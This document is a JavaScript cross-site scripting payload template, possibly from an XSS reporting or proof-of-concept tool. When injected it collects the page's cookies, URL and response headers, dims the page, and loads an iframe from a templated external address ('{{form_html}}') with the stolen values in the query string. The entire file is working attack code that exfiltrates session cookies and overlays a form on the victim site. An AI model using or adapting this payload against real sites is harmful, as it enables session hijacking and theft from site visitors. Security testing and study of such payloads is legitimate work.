
(function(xssinjected) {

    if(xssinjected) return;

    window.xssinjected = 1;

    var inject = function() {
        var cookies = (document.cookie || "");
        cookies = cookies.length > 0 ? cookies.split(';') : []
        
        var query = ["host=" + (location.hostname || "localhost"),"url=" + location.href];
        var pushArray = function(arrName, arr) {
            for(var i=0; i<arr.length; i++)
                if(arr[i])
                    query.push(arrName + "=" + arr[i]);
        };
        var create = function(name) { return document.createElement(name); };
        var append = function(el) { return document.body.appendChild(el); };
        
        pushArray("cookie", cookies);
        
        var fader = create("div");
        var faderStyle = [
            "position: fixed",
            "top:0", "left:0",
            "width:110%",
            "height:110%",
            "background-color:#000",
            "opacity:0.6",
            "z-index:9998"
        ];
        fader.setAttribute('id', 'xss-fader');
        fader.setAttribute('style', faderStyle.join(';'));
        append(fader);

        if (typeof XMLHttpRequest == "undefined") {
            XMLHttpRequest = function () {
                var versions = ["Msxml2.XMLHTTP.6.0", "Msxml2.XMLHTTP.3.0", "Microsoft.XMLHTTP"];
                for(var i = 0; i < versions.length; i++){
                    try { return new ActiveXObject(versions[i]); } catch (e) {}
                }
                throw new Error("This browser does not support XMLHttpRequest.");
            };
        };
        
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if(this.readyState == 2) {
                var headers = this.getAllResponseHeaders() || "";
                
                pushArray("header", headers.split('\n'));
                var frame = create("iframe");
                var frameStyle = [
                    "height:850px",
                    "width:620px",
                    "position:absolute",
                    "top:100px", "left:50%",
                    "margin:0 0 0 -310px",
                    "background:none repeat scroll 0 0 #FFFFFF",
                    "border:1px solid #bbb",
                    "-moz-border-radius:15px",
                    "border-radius:15px",
                    "display:block",
                    "padding:0",
                    "z-index:9999"
                ];
                frame.setAttribute('style', frameStyle.join(';'));
                frame.setAttribute('src', "{{form_html}}?" + query.join('&'));

                append(frame);
            }
        };
        xhr.open("GET",location.href,true);
        xhr.send();
    };

    if(!document.body) {
        if (window.addEventListener) {
            window.addEventListener("load", inject(), false);
        }
    } else {
        inject();
    }

})(window.xssinjected);

